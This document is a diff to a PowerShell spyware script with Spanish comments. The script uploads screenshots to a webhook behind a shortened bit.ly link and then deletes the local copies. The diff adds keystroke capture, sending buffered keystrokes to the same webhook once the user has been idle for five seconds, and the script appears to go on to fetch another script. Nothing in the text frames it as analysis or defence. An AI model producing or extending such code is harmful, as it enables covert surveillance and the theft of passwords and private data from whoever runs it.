@@ -1,7 +1,18 @@
 $hookurl = "https://bit.ly/chu_kbras"
 $seconds = 30 # Intervalo entre capturas
+$inactiveSeconds = 5 # Segundos de inactividad antes de enviar registros de teclado
 $a = 0 # Contador de imágenes enviadas al webhook
 $maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script
+$keystrokeBuffer = ""
+
+# Función para enviar registros de teclado al webhook
+function SendKeystrokes {
+    if ($keystrokeBuffer.Length -gt 0) {
+        $keystrokes = $keystrokeBuffer.Trim()
+        $keystrokeBuffer = ""
+        curl.exe -F "keystrokes=$keystrokes" $hookurl
+    }
+}
 
 # Detección de URL acortada
 if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected!!..." ; $hookurl = (irm $hookurl).url}
@@ -23,6 +34,13 @@ do {
     curl.exe -F "file1=@$filett" $hookurl
     Start-Sleep 1
     Remove-Item -Path $filett
+
+    # Captura y envío de registros de teclado después de cierta inactividad
+    $idle = [System.Windows.Forms.SystemInformation]::IdleTime
+    if ($idle -ge $inactiveSeconds * 1000) {
+        SendKeystrokes
+    }
+
     Start-Sleep $seconds
 
     # Incrementar contador de imágenes enviadas al webhook
